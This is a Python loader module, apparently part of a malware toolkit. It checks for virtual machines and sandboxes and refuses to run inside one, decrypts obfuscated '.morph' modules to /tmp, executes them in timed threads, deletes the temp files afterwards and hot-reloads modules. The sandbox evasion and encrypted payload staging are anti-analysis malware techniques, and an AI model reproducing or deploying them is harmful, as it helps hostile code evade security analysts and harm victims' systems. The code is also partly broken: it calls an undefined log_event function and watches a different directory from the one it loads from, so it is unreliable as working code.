# File: modules/loader.py

"""
Enhanced loader:
• Detects if running in sandbox / VM (VM‑specific artifacts).
• Decrypts .morph modules on the fly to /tmp/<module>.py, imports them, then removes the temp file.
• Enforces per‑module timeouts and memory checks.
• Auto‑reloads modules if updated.
"""

import importlib.util
import sys
import time
import os
import threading
import psutil
import platform
from pathlib import Path
from types import ModuleType
from modules import obfuscation
import logging

logger = logging.getLogger("loader")

MODULE_DIR = Path(__file__).parent / "modules"
TIMEOUT = 60  # default module execution timeout

def _is_vm_or_sandbox() -> bool:
    """
    Basic sandbox detection:
    • Check for virtualization in /sys/class/dmi/id/* or CPU flags.
    • Check low memory (<2GB) or single CPU core.
    """
    try:
        if platform.system() == "Linux":
            dmi = open("/sys/class/dmi/id/product_name", "r").read().lower()
            if any(x in dmi for x in ["virtualbox", "vmware", "kvm", "qemu"]):
                return True
        vm_indicators = ["VBOX", "VMWARE", "XEN", "QEMU"]
        cpuflags = open("/proc/cpuinfo", "r").read().upper()
        if any(flag in cpuflags for flag in vm_indicators):
            return True
    except Exception:
        pass

    mem = psutil.virtual_memory()
    if mem.total < 2 * 1024**3:  # less than 2GB
        return True
    if psutil.cpu_count(logical=False) == 1:
        return True
    return False

def run_module(mod_name: str, args: dict = None, timeout: int = TIMEOUT) -> dict:
    """
    Decrypts <mod_name>.morph to /tmp/<mod_name>.py, imports and runs its run(args).
    Enforces timeout using threading. Returns module's return data or timeout error.
    """
    if _is_vm_or_sandbox():
        logger.error(f"[LOADER] Sandbox detected; refusing to load {mod_name}")
        return {"status": "error", "detail": "Sandbox/VM environment detected"}

    tmp_py_path = obfuscation.decrypt_module(mod_name)
    if not tmp_py_path:
        return {"status": "error", "detail": "Decryption failed"}

    result = {"status": "error", "detail": "Module timeout or failure"}
    finished = threading.Event()

    def target():
        try:
            spec = importlib.util.spec_from_file_location(mod_name, tmp_py_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules[mod_name] = module
            spec.loader.exec_module(module)
            if hasattr(module, "run"):
                ret = module.run(args or {})
                result.clear()
                result.update(ret)
            else:
                result.clear()
                result.update({"status": "error", "detail": "No run() in module"})
        except Exception as e:
            result.clear()
            result.update({"status": "error", "detail": str(e)})
        finally:
            finished.set()

    thread = threading.Thread(target=target)
    thread.daemon = True
    thread.start()
    thread.join(timeout)
    if not finished.is_set():
        result = {"status": "error", "detail": "Execution timed out"}
    # Clean up temporary file
    try:
        os.remove(tmp_py_path)
    except OSError:
        pass

    return result

def load_all_modules():
    """
    Iterates over all .morph files in MODULE_DIR, decrypts each, runs run({}) to register loops.
    """
    for morph in MODULE_DIR.glob("*.morph"):
        mod_name = morph.stem
        # Run with empty args to initialize any background loops inside modules
        run_module(mod_name, {}, timeout=30)

def start_watcher():
    """Start the module watcher for hot reloading"""
    import threading
    import time
    
    def watcher_loop():
        while True:
            try:
                # Check for module changes
                for module_file in Path(__file__).parent.glob("*.py"):
                    if module_file.name in ["__init__.py", "loader.py"]:
                        continue
                    
                    # Check if module needs reloading
                    module_name = module_file.stem
                    if module_name in sys.modules:
                        # Force reload
                        importlib.reload(sys.modules[module_name])
                        log_event("loader", f"Reloaded module: {module_name}".encode())
                
                time.sleep(30)  # Check every 30 seconds
            except Exception as e:
                log_event("loader", f"Watcher error: {e}".encode())
                time.sleep(60)
    
    threading.Thread(target=watcher_loop, daemon=True).start()
    log_event("loader", "Module watcher started".encode())
